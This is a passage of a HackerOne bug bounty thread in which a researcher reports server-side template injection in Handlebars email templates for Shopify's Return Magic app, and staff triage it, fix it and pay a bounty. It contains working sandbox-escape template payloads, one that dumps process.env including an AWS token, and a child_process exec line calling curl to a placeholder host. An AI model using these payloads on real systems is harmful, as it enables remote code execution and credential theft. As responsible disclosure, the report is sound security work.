console.log(html)\n});\n```\n\nhandlebars-example.html:\n\n```\n{{#with this as |test|}}\n{{#with (test.constructor.getOwnPropertyDescriptor this \"getStoreName\")}}\n\n{{#with (test.constructor.defineProperty test.constructor.prototype \"toString\" this)}}\n\n {{#with (test.constructor.constructor \"test\")}} {{/with}}\n\n{{/with}}\n\n{{/with}}\n{{/with}}\n```\n\nNow when you run `test.js` using node:\n```\n$ node hand.js\n13193\n```\n\nHence, sandbox is escaped and now we are able to execute any function outside the sandbox.\n\nSo all what I have to do to get this working on shopify will be to find a function defined within the scope that acts as `getStoreName` in my example (returns user controlled input). \n\nHere is an example that will work on shopify to prove the ability to execute functions:\n\nTo execute the following functions\n```\nArray.map([\"xxxx\", \"aaaa\"], String.toUpperCase, this)\nString.toUpperCase(\"xxxx\");\nString.toUpperCase(\"aaaa\");\n```\n\nWe use the template\n```\n{{#with 1 as |test|}}\n  {{#blockHelperMissing test as |testx|}} // This line will create an array and then we can access its constructor\n    {{#with (testx.constructor \"xxxx\" \"aaaaa\")}}\n      {{this.pop}}\n      {{testx.map this.constructor.name.toUpperCase this}}\n    {{/with}}\n  {{/blockHelperMissing}}\n{{/with}}\n```\n\nSend yourself a test email, and the response will be `XXXX,AAAAA,XXXX,AAAAA`\n\nBy the way, you might be thinking that I could use `map()` to call Function constructor on my provided input without handlebars compiler sending extra parameters, however, this won't work because map calls the constructor like this `Function(arr[i], i, arr)` which causes an error since `i` is an integer and being passed as the name of function parameter.\n `map` and friends are ill-designed in Javascript, there's no way to stop them from passing unwanted parameters :( \n\n\n## Here is an explanation of the exploit template\n\n`{{#with this as |test|}} `\nwith is a helper that sets whichever assigned to it as the context, we name our context `test`.\n\n`{{#with (test.constructor.getOwnPropertyDescriptor this \"getStoreName\")}}`\nget the context resulted from the evaluated function, in this case, the descriptor of `this.getStoreName` where this is the template scope defined in data variable in `test.js`.\n\n`{{#with (test.constructor.defineProperty test.constructor.prototype \"toString\" this)}} `\nevaluate the function  test.constructor.defineProperty to overwrite `Object.prototype.toString` \n\n`{{#with (test.constructor.constructor \"test\")}}`\nwith will evaluate the function `test.constructor.constructor(\"test\")` and will also evaluate whichever returned from the it which is an anonymous function:\n```\nfunction anonymous(test){\nconsole.log(process.pid)\n```\n\nit evaluates the anonymous function because of this line on its implementation:\n\n ```\nif (_utils.isFunction(context)) {\n   context = context.call(this);\n  }\n```","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nI have found out that the template engine is handlebars. \u003cbr\u003e\nHandlebars is supposed to be a logic-less template built on top of mustache, however, I have found a way to call any function within the scope (even the Function constructor). \u003c/p\u003e\n\n\u003cp\u003eThe only problem I am facing right now is that whenever a function is called within the template, the template compiler sends the current scope (this) as the last parameter. \u003c/p\u003e\n\n\u003cp\u003eFor example if I try to call something like \u003ccode\u003econstructor.constructor(\u0026quot;test\u0026quot;,\u0026quot;test\u0026quot;)\u003c/code\u003e, the compiler will call it like \u003ccode\u003econstructor.constructor(\u0026quot;test\u0026quot;, this)\u003c/code\u003e and since \u003ccode\u003ethis\u003c/code\u003e will be converted to a string then the anonymous function created will be: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efunction anonymous(test,test){\n[object Object]\n} \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewhich will cause an error.\u003c/p\u003e\n\n\u003cp\u003eSo I came up with an idea to overwrite the \u003ccode\u003eObject.prototype.toString\u003c/code\u003e function using \u003ccode\u003eObject.defineProperty\u003c/code\u003e so that it calls a function that returns a user controlled string.\u003c/p\u003e\n\n\u003cp\u003eAnd since I can\u0026#39;t define functions using the template. All I have to do is to find a function that is already defined within the template scope and returns a user controlled input. For example, a function like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efunction getStoreName(){\nreturn storeName;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere is how my local testing for this looks like:\u003c/p\u003e\n\n\u003cp\u003etest.js:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evar handlebars = require(\u0026#39;handlebars\u0026#39;),\n  fs = require(\u0026#39;fs\u0026#39;);\n// StoreName is a user controlled input. The user can change his storename to whatever he wants\nvar storeName = \u0026quot;console.log(process.pid)\u0026quot;\nfunction getStoreName(){\n  return storeName;\n}\n\nvar data = {\n  getStoreName: getStoreName\n}\n\nfs.readFile(\u0026#39;handlebars-example.html\u0026#39;, \u0026#39;utf-8\u0026#39;, function(error, source){\n  handlebars.registerHelper(\u0026#39;custom_title\u0026#39;, function(title, nop){\n  console.log(title);\n  })\n\n  var template = handlebars.compile(source);\n  var html = template(data);\n  console.log(html)\n});\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ehandlebars-example.html:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{{#with this as |test|}}\n{{#with (test.constructor.getOwnPropertyDescriptor this \u0026quot;getStoreName\u0026quot;)}}\n\n{{#with (test.constructor.defineProperty test.constructor.prototype \u0026quot;toString\u0026quot; this)}}\n\n {{#with (test.constructor.constructor \u0026quot;test\u0026quot;)}} {{/with}}\n\n{{/with}}\n\n{{/with}}\n{{/with}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow when you run \u003ccode\u003etest.js\u003c/code\u003e using node:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ node hand.js\n13193\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHence, sandbox is escaped and now we are able to execute any function outside the sandbox.\u003c/p\u003e\n\n\u003cp\u003eSo all what I have to do to get this working on shopify will be to find a function defined within the scope that acts as \u003ccode\u003egetStoreName\u003c/code\u003e in my example (returns user controlled input). \u003c/p\u003e\n\n\u003cp\u003eHere is an example that will work on shopify to prove the ability to execute functions:\u003c/p\u003e\n\n\u003cp\u003eTo execute the following functions\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eArray.map([\u0026quot;xxxx\u0026quot;, \u0026quot;aaaa\u0026quot;], String.toUpperCase, this)\nString.toUpperCase(\u0026quot;xxxx\u0026quot;);\nString.toUpperCase(\u0026quot;aaaa\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe use the template\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{{#with 1 as |test|}}\n  {{#blockHelperMissing test as |testx|}} // This line will create an array and then we can access its constructor\n    {{#with (testx.constructor \u0026quot;xxxx\u0026quot; \u0026quot;aaaaa\u0026quot;)}}\n      {{this.pop}}\n      {{testx.map this.constructor.name.toUpperCase this}}\n    {{/with}}\n  {{/blockHelperMissing}}\n{{/with}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSend yourself a test email, and the response will be \u003ccode\u003eXXXX,AAAAA,XXXX,AAAAA\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eBy the way, you might be thinking that I could use \u003ccode\u003emap()\u003c/code\u003e to call Function constructor on my provided input without handlebars compiler sending extra parameters, however, this won\u0026#39;t work because map calls the constructor like this \u003ccode\u003eFunction(arr[i], i, arr)\u003c/code\u003e which causes an error since \u003ccode\u003ei\u003c/code\u003e is an integer and being passed as the name of function parameter.\u003cbr\u003e\n \u003ccode\u003emap\u003c/code\u003e and friends are ill-designed in Javascript, there\u0026#39;s no way to stop them from passing unwanted parameters :( \u003c/p\u003e\n\n\u003ch2 id=\"here-is-an-explanation-of-the-exploit-template\"\u003eHere is an explanation of the exploit template\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003e{{#with this as |test|}}\u003c/code\u003e\u003cbr\u003e\nwith is a helper that sets whichever assigned to it as the context, we name our context \u003ccode\u003etest\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{{#with (test.constructor.getOwnPropertyDescriptor this \u0026quot;getStoreName\u0026quot;)}}\u003c/code\u003e\u003cbr\u003e\nget the context resulted from the evaluated function, in this case, the descriptor of \u003ccode\u003ethis.getStoreName\u003c/code\u003e where this is the template scope defined in data variable in \u003ccode\u003etest.js\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{{#with (test.constructor.defineProperty test.constructor.prototype \u0026quot;toString\u0026quot; this)}}\u003c/code\u003e\u003cbr\u003e\nevaluate the function  test.constructor.defineProperty to overwrite \u003ccode\u003eObject.prototype.toString\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{{#with (test.constructor.constructor \u0026quot;test\u0026quot;)}}\u003c/code\u003e\u003cbr\u003e\nwith will evaluate the function \u003ccode\u003etest.constructor.constructor(\u0026quot;test\u0026quot;)\u003c/code\u003e and will also evaluate whichever returned from the it which is an anonymous function:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efunction anonymous(test){\nconsole.log(process.pid)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eit evaluates the anonymous function because of this line on its implementation:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif (_utils.isFunction(context)) {\n   context = context.call(this);\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-12-15T03:38:49.738Z","updated_at":"2018-12-15T03:38:49.738Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3832469,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @zombiehelp54!\n\nThanks for looking deeper into this. We've been working to replicate this on our end and had a couple questions:\n\n1. Have you taken a look at this forum post which links some of the variables available in the Return Magic email templates? https://support.returnmagic.com/hc/en-us/articles/360000774051-What-are-the-variables-I-can-use-in-my-emails-\n2. Could you elaborate more on what would be required to turn this into an RCE? From my reading of your report, it seems like you need a function that is available to the template which takes no parameters and returns a string you control. Is that correct?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e!\u003c/p\u003e\n\n\u003cp\u003eThanks for looking deeper into this. We\u0026#39;ve been working to replicate this on our end and had a couple questions:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eHave you taken a look at this forum post which links some of the variables available in the Return Magic email templates? \u003ca title=\"https://support.returnmagic.com/hc/en-us/articles/360000774051-What-are-the-variables-I-can-use-in-my-emails-\" href=\"/redirect?url=https%3A%2F%2Fsupport.returnmagic.com%2Fhc%2Fen-us%2Farticles%2F360000774051-What-are-the-variables-I-can-use-in-my-emails-\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://support.returnmagic.com/hc/en-us/articles/360000774051-What-are-the-variables-I-can-use-in-my-emails-\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eCould you elaborate more on what would be required to turn this into an RCE? From my reading of your report, it seems like you need a function that is available to the template which takes no parameters and returns a string you control. Is that correct?\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2018-12-15T15:42:27.916Z","updated_at":"2018-12-15T15:42:27.916Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3832666,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @jack_mccracken \n\n1. Yes I have had a look there but it seems these variables aren't methods so won't be able to use any of them.\n2. Yes you are correct.\n\nThanks.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eYes I have had a look there but it seems these variables aren\u0026#39;t methods so won\u0026#39;t be able to use any of them.\u003c/li\u003e\n\u003cli\u003eYes you are correct.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-15T18:02:13.826Z","updated_at":"2018-12-15T18:02:13.826Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3835092,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jack_mccracken,\n\nAfter A LOT OF TIME working on this, I am finally able to do RCE without depending on the template context.\n\nPlease use this as a template then send yourself a test email and you'll get `process.env`. I executed `JSON.stringify(process.env)`\n\n\n```\n{{#with \"hola\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return JSON.stringify(process.env);\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}\n```","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAfter A LOT OF TIME working on this, I am finally able to do RCE without depending on the template context.\u003c/p\u003e\n\n\u003cp\u003ePlease use this as a template then send yourself a test email and you\u0026#39;ll get \u003ccode\u003eprocess.env\u003c/code\u003e. I executed \u003ccode\u003eJSON.stringify(process.env)\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{{#with \u0026quot;hola\u0026quot; as |string|}}\n  {{#with \u0026quot;e\u0026quot;}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \u0026quot;constructor\u0026quot;)}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \u0026quot;return JSON.stringify(process.env);\u0026quot;}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-12-16T16:55:46.217Z","updated_at":"2018-12-16T17:09:37.190Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3835093,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a screenshot","markdown_message":"\u003cp\u003eHere is a screenshot\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-16T16:56:39.218Z","updated_at":"2018-12-16T16:56:39.218Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3835106,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've just noticed that I got AWS access token as it was stored in `process.env` ","markdown_message":"\u003cp\u003eI\u0026#39;ve just noticed that I got AWS access token as it was stored in \u003ccode\u003eprocess.env\u003c/code\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-16T17:03:31.126Z","updated_at":"2018-12-16T17:03:31.126Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3835107,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Am I allowed to use it to see if I can get into more servers?","markdown_message":"\u003cp\u003eAm I allowed to use it to see if I can get into more servers?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-16T17:04:10.791Z","updated_at":"2018-12-16T17:04:10.791Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3835129,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @zombiehelp54,\nthanks for following up with the additional information.\n\nWith regards to your question, no, please stop your testing now while we investigate.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003cbr\u003e\nthanks for following up with the additional information.\u003c/p\u003e\n\n\u003cp\u003eWith regards to your question, no, please stop your testing now while we investigate.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-16T17:18:38.286Z","updated_at":"2018-12-16T17:18:38.286Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3835131,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Peter,\nThanks for the fast reply. I will stop testing.","markdown_message":"\u003cp\u003eHi Peter,\u003cbr\u003e\nThanks for the fast reply. I will stop testing.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-16T17:19:45.126Z","updated_at":"2018-12-16T17:21:58.104Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3835447,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @zombiehelp54!\n\nWe've replicated this on our end and are working on a fix. We'll keep you updated.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e!\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve replicated this on our end and are working on a fix. We\u0026#39;ll keep you updated.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-16T20:27:19.535Z","updated_at":"2018-12-16T20:27:19.535Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3835455,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-16T20:31:30.894Z","updated_at":"2018-12-16T20:31:30.894Z","additional_data":{"old_title":"[almostbugs] - Server Side Template Injection in Return Magic email templates?","new_title":"Server Side Template Injection in Return Magic email templates?"},"actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3835456,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is also not really an almostbug so much as a proper bug now so I'll change it over :D ","markdown_message":"\u003cp\u003eThis is also not really an almostbug so much as a proper bug now so I\u0026#39;ll change it over :D \u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-16T20:31:49.143Z","updated_at":"2018-12-16T20:31:49.143Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3835778,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jack_mccracken, I never really thought it would ever be a \"bug\" haha. \nBy the way, it's possible to execute system commands using `process.mainModule.constructor._load('child_process').exec('curl http://[ip]:[port]/');` since `global.require` is not defined. \n\nThanks!","markdown_message":"\u003cp\u003e\u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e, I never really thought it would ever be a \u0026quot;bug\u0026quot; haha. \u003cbr\u003e\nBy the way, it\u0026#39;s possible to execute system commands using \u003ccode\u003eprocess.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl http://[ip]:[port]/\u0026#39;);\u003c/code\u003e since \u003ccode\u003eglobal.require\u003c/code\u003e is not defined. \u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-17T00:58:59.311Z","updated_at":"2018-12-17T00:58:59.311Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3842878,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @zombiehelp54,\n\nWe've deployed a fix for this issue by switching from handlebars.js to mustache.js for the user-supplied templates. This should stop the usage of Handlebars helper functions and still provide the templating functionality that a lot of our merchants use. I'd appreciate it if you gave this a look from your end and let us know if you can find any bypasses or weird behaviour with the mustache templates.\n\nSince switching templating engines is a significant change, we will leave this issue in `Triaged` state for the next couple of days to make sure merchants do not experience problems with the new engine.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve deployed a fix for this issue by switching from handlebars.js to mustache.js for the user-supplied templates. This should stop the usage of Handlebars helper functions and still provide the templating functionality that a lot of our merchants use. I\u0026#39;d appreciate it if you gave this a look from your end and let us know if you can find any bypasses or weird behaviour with the mustache templates.\u003c/p\u003e\n\n\u003cp\u003eSince switching templating engines is a significant change, we will leave this issue in \u003ccode\u003eTriaged\u003c/code\u003e state for the next couple of days to make sure merchants do not experience problems with the new engine.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-17T22:30:29.437Z","updated_at":"2018-12-17T22:30:29.437Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3860449,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jack_mccracken,\nEverything looks fixed for me. Also I don't think it will be possible to do the same with mustache as function calls and parameters are fundamentally incompatible with mustache's \"logic-free\" core principle.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e,\u003cbr\u003e\nEverything looks fixed for me. Also I don\u0026#39;t think it will be possible to do the same with mustache as function calls and parameters are fundamentally incompatible with mustache\u0026#39;s \u0026quot;logic-free\u0026quot; core principle.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T12:30:40.157Z","updated_at":"2018-12-18T12:30:40.157Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3863358,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We're going to close this as resolved and move it back to triaged if needed because of a revert. Thanks so much for your help improving the security of Shopify! You should hear about bounty amounts within the week.","markdown_message":"\u003cp\u003eWe\u0026#39;re going to close this as resolved and move it back to triaged if needed because of a revert. Thanks so much for your help improving the security of Shopify! You should hear about bounty amounts within the week.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T19:32:22.652Z","updated_at":"2018-12-18T19:32:22.652Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"zombiehelp54","url":"/zombiehelp54"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3863979,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Congrats on upgrading this from an almost-bug to a complete proof of concept! As announced at the H1-514 event, we're paying out full bounties for any almost-bugs that turn out to be exploitable. In this case, we're rewarding a $10,000 bounty, which is at the low end of the \"arbitrary code execution\" scale for category A. We feel this is appropriate since Return Magic has access to less merchant data than other applications in this category, limiting the impact of this vulnerability.\n\nWe're thrilled that you're continuing to focus on our applications, and look forward to hearing from you again soon!","markdown_message":"\u003cp\u003eCongrats on upgrading this from an almost-bug to a complete proof of concept! As announced at the H1-514 event, we\u0026#39;re paying out full bounties for any almost-bugs that turn out to be exploitable. In this case, we\u0026#39;re rewarding a $10,000 bounty, which is at the low end of the \u0026quot;arbitrary code execution\u0026quot; scale for category A. We feel this is appropriate since Return Magic has access to less merchant data than other applications in this category, limiting the impact of this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re thrilled that you\u0026#39;re continuing to focus on our applications, and look forward to hearing from you again 